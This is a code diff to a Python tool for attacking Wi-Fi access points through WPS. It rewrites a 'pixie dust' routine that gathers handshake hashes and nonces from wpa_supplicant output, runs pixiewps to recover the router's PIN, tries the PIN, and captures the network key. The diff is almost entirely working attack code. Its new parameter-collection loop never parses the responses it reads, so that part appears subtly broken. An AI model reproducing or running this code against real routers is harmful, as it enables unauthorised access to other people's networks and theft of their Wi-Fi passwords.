@@ -379,23 +379,98 @@ class Initialize:
         """Try to perform a pixie dust attack."""
         
         try:
-            # Generate pixie dust command
-            pixie_cmd = f'pixiewps -e {self.PIXIE_CREDS.E_NONCE} -s {self.PIXIE_CREDS.E_HASH1} -z {self.PIXIE_CREDS.E_HASH2} -a {self.PIXIE_CREDS.PKR} -b {self.PIXIE_CREDS.PKE}'
+            # First collect the required WPS parameters
+            print('[*] Collecting WPS parameters...')
             
-            if show_pixie_cmd:
-                print(f'[+] Pixie dust command: {pixie_cmd}')
+            # Start WPS registration to collect parameters
+            self._sendOnly('WPS_REG')
+            time.sleep(1)
+            
+            # Wait for parameters to be collected
+            timeout = 30  # seconds
+            start_time = time.time()
+            parameters_collected = False
+            
+            while time.time() - start_time < timeout:
+                response = self._recvResponse()
+                if not response:
+                    continue
+                    
+                for line in response.splitlines():
+                    if 'WPS-FAIL' in line:
+                        print('[-] WPS registration failed')
+                        return False
+                        
+                    # Check if we have all required parameters
+                    if (self.PIXIE_CREDS.PKE and 
+                        self.PIXIE_CREDS.PKR and 
+                        self.PIXIE_CREDS.E_HASH1 and 
+                        self.PIXIE_CREDS.E_HASH2 and 
+                        self.PIXIE_CREDS.E_NONCE):
+                        parameters_collected = True
+                        break
+                        
+                if parameters_collected:
+                    break
+                    
+                time.sleep(0.1)
                 
+            if not parameters_collected:
+                print('[-] Failed to collect required WPS parameters')
+                return False
+                
+            print('[+] WPS parameters collected successfully')
+            
+            # Build pixiewps command with collected parameters
+            pixie_cmd = [
+                'pixiewps',
+                '-e', self.PIXIE_CREDS.PKE,
+                '-r', self.PIXIE_CREDS.PKR,
+                '-s', self.PIXIE_CREDS.E_HASH1,
+                '-z', self.PIXIE_CREDS.E_HASH2,
+                '-a', self.PIXIE_CREDS.AUTHKEY,
+                '-n', self.PIXIE_CREDS.E_NONCE
+            ]
+            
             if pixie_force:
-                pixie_cmd += ' -f'
+                pixie_cmd.append('-f')
                 
-            # Run pixie dust command
-            subprocess.run(pixie_cmd, shell=True, check=True)
-            
-            return True
-            
+            if show_pixie_cmd:
+                print(f'[+] Pixie dust command: {" ".join(pixie_cmd)}')
+                
+            # Run pixiewps command
+            try:
+                result = subprocess.run(
+                    pixie_cmd,
+                    capture_output=True,
+                    text=True,
+                    check=True
+                )
+                
+                # Parse PIN from pixiewps output
+                for line in result.stdout.splitlines():
+                    if '[+] WPS pin:' in line:
+                        pin = line.split(':')[1].strip()
+                        print(f'[+] Found PIN: {pin}')
+                        
+                        # Try the found PIN
+                        if self._tryPin(pin):
+                            return True
+                            
+                print('[-] No valid PIN found in pixiewps output')
+                return False
+                
+            except subprocess.CalledProcessError as e:
+                print(f'[-] Pixiewps command failed: {e.stderr}')
+                return False
+                
         except Exception as e:
-            print(f'[-] Error performing pixie dust attack: {str(e)}')
+            print(f'[-] Error during pixie dust attack: {str(e)}')
             return False
+            
+        finally:
+            # Cancel WPS session
+            self._sendOnly('WPS_CANCEL')
 
     def _tryPbc(self) -> bool:
         """Try to connect using WPS PBC mode."""
@@ -467,116 +542,104 @@ class Initialize:
     def _handleResponse(self, line: str, timing: dict) -> bool:
         """Handles WPA supplicant output and updates connection status."""
         
-        # pylint: disable=invalid-name
         if not line:
             self.WPAS.wait()
             return False
-
+            
         line = line.rstrip('\n')
-
+        
         if self.PRINT_DEBUG:
             sys.stderr.write(line + '\n')
-
+            
         if line.startswith('WPS: '):
-            if 'M2D' in line:
-                print('[-] Received WPS Message M2D')
-                src.utils.die('[-] Error: AP is not ready yet, try later')
-            if 'Building Message M' in line:
-                n = int(line.split('Building Message M')[1])
-                self.CONNECTION_STATUS.LAST_M_MESSAGE = n
-                print(f'[*] Sending WPS Message M{n}…')
-            elif 'Received M' in line:
-                n = int(line.split('Received M')[1])
-                self.CONNECTION_STATUS.LAST_M_MESSAGE = n
-                print(f'[*] Received WPS Message M{n}')
-                if n == 5:
-                    print('[+] The first half of the PIN is valid')
-            elif 'Received WSC_NACK' in line:
-                self.CONNECTION_STATUS.STATUS = 'WSC_NACK'
-                print('[-] Received WSC NACK')
-                print('[-] Error: wrong PIN code')
-            elif 'Enrollee Nonce' in line and 'hexdump' in line:
+            line = line.replace('WPS: ', '')
+            
+            if 'Building Message M1' in line:
+                self.CONNECTION_STATUS.LAST_M_MESSAGE = 1
+            elif 'Building Message M3' in line:
+                self.CONNECTION_STATUS.LAST_M_MESSAGE = 3
+            elif 'Building Message M5' in line:
+                self.CONNECTION_STATUS.LAST_M_MESSAGE = 5
+            elif 'Building Message M7' in line:
+                self.CONNECTION_STATUS.LAST_M_MESSAGE = 7
+            elif 'Received M2' in line:
+                self.CONNECTION_STATUS.LAST_M_MESSAGE = 2
+            elif 'Received M4' in line:
+                self.CONNECTION_STATUS.LAST_M_MESSAGE = 4
+            elif 'Received M6' in line:
+                self.CONNECTION_STATUS.LAST_M_MESSAGE = 6
+            elif 'Received M8' in line:
+                self.CONNECTION_STATUS.LAST_M_MESSAGE = 8
+                
+            # Capture WPS parameters
+            if 'Enrollee Nonce' in line and 'hexdump' in line:
                 self.PIXIE_CREDS.E_NONCE = self._getHex(line)
-                assert len(self.PIXIE_CREDS.E_NONCE) == 16 * 2
-                if pixie_dust:
-                    print(f'[P] E-Nonce: {self.PIXIE_CREDS.E_NONCE}')
+                print('[*] Captured E-Nonce')
+                
             elif 'DH own Public Key' in line and 'hexdump' in line:
                 self.PIXIE_CREDS.PKR = self._getHex(line)
-                assert len(self.PIXIE_CREDS.PKR) == 192 * 2
-                if pixie_dust:
-                    print(f'[P] PKR: {self.PIXIE_CREDS.PKR}')
+                print('[*] Captured PKR')
+                
             elif 'DH peer Public Key' in line and 'hexdump' in line:
                 self.PIXIE_CREDS.PKE = self._getHex(line)
-                assert len(self.PIXIE_CREDS.PKE) == 192 * 2
-                if pixie_dust:
-                    print(f'[P] PKE: {self.PIXIE_CREDS.PKE}')
+                print('[*] Captured PKE')
+                
             elif 'AuthKey' in line and 'hexdump' in line:
                 self.PIXIE_CREDS.AUTHKEY = self._getHex(line)
-                assert len(self.PIXIE_CREDS.AUTHKEY) == 32 * 2
-                if pixie_dust:
-                    print(f'[P] AuthKey: {self.PIXIE_CREDS.AUTHKEY}')
+                print('[*] Captured AuthKey')
+                
             elif 'E-Hash1' in line and 'hexdump' in line:
                 self.PIXIE_CREDS.E_HASH1 = self._getHex(line)
-                assert len(self.PIXIE_CREDS.E_HASH1) == 32 * 2
-                if pixie_dust:
-                    print(f'[P] E-Hash1: {self.PIXIE_CREDS.E_HASH1}')
+                print('[*] Captured E-Hash1')
+                
             elif 'E-Hash2' in line and 'hexdump' in line:
                 self.PIXIE_CREDS.E_HASH2 = self._getHex(line)
-                assert len(self.PIXIE_CREDS.E_HASH2) == 32 * 2
-                if pixie_dust:
-                    print(f'[P] E-Hash2: {self.PIXIE_CREDS.E_HASH2}')
+                print('[*] Captured E-Hash2')
+                
             elif 'Network Key' in line and 'hexdump' in line:
                 self.CONNECTION_STATUS.STATUS = 'GOT_PSK'
-                self.CONNECTION_STATUS.WPA_PSK = bytes.fromhex(self._getHex(line)).decode('utf-8', errors='replace')
-        elif ': State: ' in line:
-            if '-> SCANNING' in line:
-                self.CONNECTION_STATUS.STATUS = 'scanning'
-                print('[*] Scanning…')
-        elif ('WPS-FAIL' in line) and (self.CONNECTION_STATUS.STATUS != ''):
+                self.CONNECTION_STATUS.PSK = self._getHex(line)
+                
+        elif 'NL80211_CMD_DEL_STATION' in line:
+            print('[!] Interface is busy')
+            
+        elif 'rfkill' in line:
+            print('[!] Interface is blocked by rfkill')
+            
+        elif 'WPS-FAIL' in line:
             self.CONNECTION_STATUS.STATUS = 'WPS_FAIL'
-            error_message = self._explainWpasNotOkStatus('WPS_REG', line)
-            print(error_message)
-            if 'rate limiting' in error_message.lower():
-                self._handle_error_recovery('rate_limit', bssid, timing['manufacturer'])
-            elif 'timeout' in error_message.lower():
-                self._handle_error_recovery('timeout', bssid, timing['manufacturer'])
-            elif 'auth fail' in error_message.lower():
-                self._handle_error_recovery('auth_fail', bssid, timing['manufacturer'])
-            elif 'interference' in error_message.lower():
-                self._handle_error_recovery('interference', bssid, timing['manufacturer'])
-            return False
+            
+        elif 'WPS-TIMEOUT' in line:
+            self.CONNECTION_STATUS.STATUS = 'WPS_TIMEOUT'
+            print('[-] WPS operation timed out')
+            
+        elif 'CTRL-EVENT-CONNECTED' in line:
+            self.CONNECTION_STATUS.STATUS = 'CONNECTED'
+            print('[+] Connected successfully')
+            
         elif 'Trying to authenticate with' in line:
             self.CONNECTION_STATUS.STATUS = 'authenticating'
             if 'SSID' in line:
-                self.CONNECTION_STATUS.ESSID = codecs.decode('\''.join(line.split('\'')[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
-            print('[*] Authenticating…')
+                self.CONNECTION_STATUS.ESSID = line.split('SSID')[1].strip()
+                
         elif 'Authentication response' in line:
-            print('[+] Authenticated')
+            self.CONNECTION_STATUS.STATUS = 'authenticated'
+            
         elif 'Trying to associate with' in line:
             self.CONNECTION_STATUS.STATUS = 'associating'
-            if 'SSID' in line:
-                self.CONNECTION_STATUS.ESSID = codecs.decode('\''.join(line.split('\'')[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
-            print('[*] Associating with AP…')
-        elif ('Associated with' in line) and (self.INTERFACE in line):
-            bssid = line.split()[-1].upper()
-            if self.CONNECTION_STATUS.ESSID:
-                print(f'[+] Associated with {bssid} (ESSID: {self.CONNECTION_STATUS.ESSID})')
-            else:
-                print(f'[+] Associated with {bssid}')
+            
+        elif 'Associated with' in line:
+            self.CONNECTION_STATUS.STATUS = 'associated'
+            
         elif 'EAPOL: txStart' in line:
             self.CONNECTION_STATUS.STATUS = 'eapol_start'
-            print('[*] Sending EAPOL Start…')
+            
         elif 'EAP entering state IDENTITY' in line:
-            print('[*] Received Identity Request')
-        elif 'using real identity' in line:
-            print('[*] Sending Identity Response…')
-        elif 'WPS-TIMEOUT' in line:
-            print('[-] Warning: Received WPS-TIMEOUT')
-        elif pbc_mode and ('selected BSS ' in line):
-            bssid = line.split('selected BSS ')[-1].split()[0].upper()
-            self.CONNECTION_STATUS.BSSID = bssid
-            print(f'[*] Selected AP: {bssid}')
-
+            self.CONNECTION_STATUS.STATUS = 'eap_identity'
+            
+        elif 'EAP entering state WSC_START' in line:
+            self.CONNECTION_STATUS.STATUS = 'wsc_start'
+            
         return True
 
     def _handle_wps_state_machine(self, bssid: str, pin: str, manufacturer: str):
